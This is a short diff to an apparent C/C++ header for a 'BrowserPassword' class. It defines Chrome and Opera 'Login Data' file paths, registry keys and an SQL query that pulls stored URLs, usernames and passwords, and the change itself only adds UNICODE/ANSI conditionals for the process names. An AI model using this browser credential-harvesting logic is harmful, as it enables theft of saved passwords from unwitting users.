@@ -10,11 +10,20 @@
 
 # define C_DBFILE	"\\Google\\Chrome\\User Data\\Default\\Login Data" 
 # define C_REGKEY	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
-# define C_PROCESS	L"chrome.exe"
 # define O_DBFILE	"\\Opera Software\\Opera Stable\\Login Data" 
 # define O_REGKEY	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
-# define O_PROCESS	L"opera.exe"
 # define QUERY		"SELECT origin_url, username_value, length(password_value), password_value FROM logins"
+
+#ifdef _UNICODE
+# define C_PROCESS	L"chrome.exe"
+# define O_PROCESS	L"opera.exe"
+#elif UNICODE
+#define C_PROCESS	L"chrome.exe"
+# define O_PROCESS	L"opera.exe"
+#else // ANSI
+#define C_PROCESS	"chrome.exe"
+# define O_PROCESS	"opera.exe"
+#endif /* UNICODE */
 
 class BrowserPassword
 {
